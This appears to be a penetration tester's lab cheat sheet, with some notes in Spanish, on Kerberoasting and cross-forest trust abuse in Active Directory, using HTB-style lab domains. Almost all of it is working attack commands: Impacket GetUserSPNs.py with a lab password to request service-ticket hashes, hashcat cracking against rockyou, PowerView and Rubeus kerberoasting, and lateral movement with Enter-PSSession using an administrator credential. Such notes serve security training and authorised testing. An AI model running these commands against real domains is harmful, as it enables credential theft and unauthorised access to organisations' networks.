# Kerberosting
## Linux
Kerberoasting is an attack technique used to obtain service account credentials by abusing the Kerberos authentication protocol. The attack is based on requesting Ticket Granting Service (TGS) tickets for accounts that have a Service Principal Name (SPN) associated with them.

To perform this attack, a valid domain user account is required:
```
GetUserSPNs.py active.htb/SVC_TGS:GPPstillStandingStrong2k18
```
Note: In some cases, the password is not necessary
This command enumerates SPNs and identifies service accounts for which TGS tickets can be requested.

Once a vulnerable service account is identified, the TGS ticket hash can be requested and saved for offline cracking:

```
ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 14:06:40.351723  2026-02-02 21:11:16.477762             
```
Una vez echo el reconocimiento comenzamos con guardar el hash para poder descrackearlo
```
GetUserSPNs.py active.htb/SVC_TGS:GPPstillStandingStrong2k18 -request > admin.hash
```
Finally, the extracted hash is cracked using a dictionary attack:
```
hashcat -m 13100 admin.hash /usr/share/wordlists/rockyou.txt
```

## Windows
Preparing the system
```
Import-Module .\PowerView.ps1
```
Get usernames
```
Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName
Get-DomainUser * -spn | select samaccountname
```
Get the hash
```
Get-DomainUser -Identity svc_vmwaresso | Get-DomainSPNTicket -Format Hashcat | Select-Object -ExpandProperty Hash
```

# Cross-Forest Trust Abuse

## Windows
Enumeration
```
Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL | select SamAccountName
Get-DomainUser -Domain FREIGHTLOGISTICS.LOCAL -Identity mssqlsvc |select samaccountname,memberof
```
Atack
```
.\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap
```
## Password Re-Use
Enumeration
```
Get-DomainForeignGroupMember -Domain FREIGHTLOGISTICS.LOCAL
Convert-SidToName ADMINSID
```
Lateral Movement
```
Enter-PSSession -ComputerName ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -Credential INLANEFREIGHT\administrator
```
## Linux
Enumeration
```
GetUserSPNs.py -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley
```
Atack
```
GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley
```
